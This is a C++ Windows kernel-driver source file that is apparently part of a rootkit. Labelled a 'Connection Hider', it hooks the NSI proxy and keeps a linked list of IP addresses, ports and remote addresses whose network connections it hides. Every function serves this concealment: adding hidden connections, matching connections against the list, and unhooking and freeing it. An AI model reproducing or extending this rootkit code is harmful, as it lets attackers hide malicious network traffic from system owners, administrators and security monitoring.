#include <wdm.h>
#include "NetworkHook.h"

NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListHead = NULL;
NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListTail = NULL;

NTSTATUS NetHook::InitNetworkHook()
{
	KdPrint(("Initializing Connection Hider..."));

	NTSTATUS status{ NsiHook::NetHookNSIProxy() };

	return status;
}

VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
{
	if ((NewConnection->IpAddress == 0) && 
		(NewConnection->RemoteIpAddress == 0) && 
		(NewConnection->Port == 0) && 
		(NewConnection->_Unknown == 0))
	{
		KdPrint(("Empty Connection!"));
		return;
	}

	if (g_NetworkLinkedListHead != NULL)
	{
		PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;

		while ((CurrentEntry != NULL) && (CurrentEntry->Connection != NULL))
		{
			if (((NewConnection->IpAddress) && (CurrentEntry->Connection->IpAddress == NewConnection->IpAddress)) ||
				((NewConnection->Port) && (CurrentEntry->Connection->Port == NewConnection->Port)) ||
				((NewConnection->RemoteIpAddress) && (CurrentEntry->Connection->RemoteIpAddress == NewConnection->RemoteIpAddress)) ||
				((NewConnection->_Unknown) && (CurrentEntry->Connection->_Unknown == NewConnection->_Unknown)))
			{
				KdPrint(("Connection Already Exists"));
				return;
			}

			CurrentEntry = CurrentEntry->NextEntry;
		}
	}

	PNET_CONNECTION_ENTRY NewEntry = (PNET_CONNECTION_ENTRY)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(NET_CONNECTION_ENTRY), TAG_NET);
	if (!NewEntry)
	{
		KdPrint(("ExAllocatePool Failed: Could not allocate NET_CONNECTION_ENTRY"));
		return;
	}

	NewEntry->Connection = (PNETHOOK_HIDDEN_CONNECTION)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(NETHOOK_HIDDEN_CONNECTION), TAG_NET);
	if (!NewEntry->Connection)
	{
		KdPrint(("ExAllocatePool Failed: Could not allocate NETHOOK_HIDDEN_CONNECTION"));
		return;
	}

	NewEntry->Connection->IpAddress = NewConnection->IpAddress;
	NewEntry->Connection->Port = NewConnection->Port;
	NewEntry->Connection->RemoteIpAddress = NewConnection->RemoteIpAddress;
	NewEntry->Connection->_Unknown = NewConnection->_Unknown;

	if (!g_NetworkLinkedListHead)
	{
		NewEntry->NextEntry = NULL;
		g_NetworkLinkedListHead = NewEntry;
		g_NetworkLinkedListTail = NewEntry;
	}
	else
	{
		NewEntry->NextEntry = NULL;
		g_NetworkLinkedListTail->NextEntry = NewEntry;
		g_NetworkLinkedListTail = NewEntry;
	}

	if(NewEntry->Connection->IpAddress)
	{
		KdPrint(("Address %d Added Successfully!", NewEntry->Connection->IpAddress));
	}

	if (NewEntry->Connection->Port)
	{
		KdPrint(("Port %d Added Successfully!", NewEntry->Connection->Port));
	}

	if (NewEntry->Connection->RemoteIpAddress)
	{
		KdPrint(("Remote Address %d Added Successfully!", NewEntry->Connection->RemoteIpAddress));
	}
}


BOOLEAN NetHook::NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG RemoteIpAddress)
{
	PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;
	union
	{
		USHORT port;
		UCHAR portbytes[2];
	}Port;
	
	Port.port = 0;
	if(PortNumber)
	{
		Port.portbytes[0] = (PortNumber >> 8) & 0xFF;
		Port.portbytes[1] = PortNumber & 0xFF;
	}

	while ((CurrentEntry != NULL) && (CurrentEntry->Connection != NULL))
	{
		if ((IpAddress && (CurrentEntry->Connection->IpAddress == IpAddress)) ||
			(Port.port && (CurrentEntry->Connection->Port == Port.port)) ||
			(RemoteIpAddress && (CurrentEntry->Connection->RemoteIpAddress == RemoteIpAddress)))
		{
			return TRUE;
		}

		CurrentEntry = CurrentEntry->NextEntry;
	}

	return FALSE;
}

VOID NetHook::UnHookNetworkProxy()
{
	NsiHook::NetNSIFreeHook();
	
	while (g_NetworkLinkedListHead)
	{
		PNET_CONNECTION_ENTRY TempPtr = g_NetworkLinkedListHead->NextEntry;
		PNETHOOK_HIDDEN_CONNECTION TempConn = g_NetworkLinkedListHead->Connection;
		
		ExFreePoolWithTag(TempConn, TAG_NET);
		TempConn = NULL;

		ExFreePoolWithTag(g_NetworkLinkedListHead, TAG_NET);
		g_NetworkLinkedListHead = TempPtr;
	}

	g_NetworkLinkedListHead = NULL;
	g_NetworkLinkedListTail = NULL;
}